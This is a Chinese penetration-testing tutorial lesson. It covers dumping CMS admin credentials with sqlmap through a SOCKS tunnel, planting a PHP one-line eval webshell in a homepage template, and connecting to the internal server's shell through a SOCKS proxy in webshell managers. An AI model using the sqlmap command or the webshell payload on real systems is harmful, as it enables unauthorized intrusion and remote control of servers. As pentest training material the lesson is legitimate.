# 网络安全实战：P72：配置SOCKS连接内网Shell

## 概述
在本节课中，我们将学习如何利用已获取的内网访问权限，通过配置SOCKS代理，连接并控制位于内网中的Web服务器Shell。整个过程涉及漏洞利用、代理配置和WebShell管理。

## 通过SQLMap获取凭证
以下是利用SQL注入漏洞的步骤：

![](img/1cb335dcfce8e04fd0c2b986040dce43_19.png)

![](img/1cb335dcfce8e04fd0c2b986040dce43_21.png)

1.  **使用SQLMap进行注入攻击**：我们可以使用SQLMap工具，通过该SQL注入漏洞直接获取数据库中的账号密码信息。
2.  **配置代理进行扫描**：由于目标IP是内网地址，我们的扫描工具（如SQLMap）无法直接访问。因此，我们需要为SQLMap配置代理，使其流量通过之前建立的SOCKS隧道。其原理是：SQLMap发出的请求包会先发送到我们的代理服务器（即运行SOCKS服务的攻击机），再由代理服务器通过隧道转发到内网目标IP的页面上。
    *   命令示例：`sqlmap -u "http://192.168.2.2/vuln_page.php?id=1" --proxy="socks5://<代理服务器IP>:1080" --dbs`
3.  **获取后台管理密码**：运行SQLMap后，成功跑出了该CMS后台管理的账号和密码。

## 登录后台并写入WebShell
获取凭证后，下一步是进入系统后台。

![](img/1cb335dcfce8e04fd0c2b986040dce43_26.png)

![](img/1cb335dcfce8e04fd0c2b986040dce43_28.png)

1.  **寻找后台地址**：通过搜索引擎或常识，找到该CMS默认的管理后台登录地址（例如 `/admin` 或 `/admin/login.php`）。
2.  **登录后台**：使用SQLMap获取到的账号密码，成功登录到CMS后台管理系统。
3.  **利用模板编辑功能写入WebShell**：许多CMS的后台提供编辑网站模板（如首页模板）的功能。由于该CMS使用PHP编写，我们可以在首页模板文件中插入一句PHP代码（即“一句话木马”），从而获得一个WebShell。
    *   **写入的PHP代码示例**：`<?php @eval($_POST[‘cmd’]);?>`
    *   **验证写入成功**：在插入代码后，我们访问网站首页，通过浏览器查看网页源代码，搜索插入的代码或相关测试字符，确认PHP脚本已被服务器成功解析执行。

## 通过SOCKS代理连接WebShell
我们已经在内网服务器上写入了一个WebShell，接下来需要连接它。

![](img/1cb335dcfce8e04fd0c2b986040dce43_35.png)

![](img/1cb335dcfce8e04fd0c2b986040dce43_37.png)

![](img/1cb335dcfce8e04fd0c2b986040dce43_38.png)

![](img/1cb335dcfce8e04fd0c2b986040dce43_40.png)

1.  **直接连接的障碍**：我们的攻击机位于外网，无法直接访问内网IP `192.168.2.2` 上的WebShell。
2.  **配置SOCKS代理**：为了连接内网的WebShell，我们需要在WebShell管理工具（如中国菜刀、蚁剑、冰蝎、C刀等）中配置SOCKS代理。
    *   **代理服务器**：填写运行着SOCKS服务（例如MSF的`auxiliary/server/socks_proxy`模块）的攻击机IP地址。
    *   **代理端口**：填写SOCKS服务监听的端口（例如1080）。
    *   **代理协议**：根据建立的代理类型选择SOCKS4或SOCKS5。
3.  **连接WebShell**：在管理工具中正确设置代理后，输入WebShell的URL地址和连接密码，即可成功建立连接，从而管理内网服务器。
4.  **工具选择**：不同的WebShell管理工具可能对代理的支持或兼容性不同。如果某个工具连接失败，可以尝试更换其他工具（如从蚁剑换到C刀），这是实战中常见的解决问题的思路。

## 总结
本节课中我们一起学习了从内网横向移动的关键一步：配置SOCKS代理连接内网Shell。我们回顾了整个流程：首先利用内网CMS的SQL注入漏洞获取后台权限，接着通过后台功能写入WebShell，最后通过在客户端工具中配置SOCKS代理，成功穿透网络边界，连接并控制了内网的Web服务器。这体现了在渗透测试中，代理通道是访问和操作内网资源的重要桥梁。
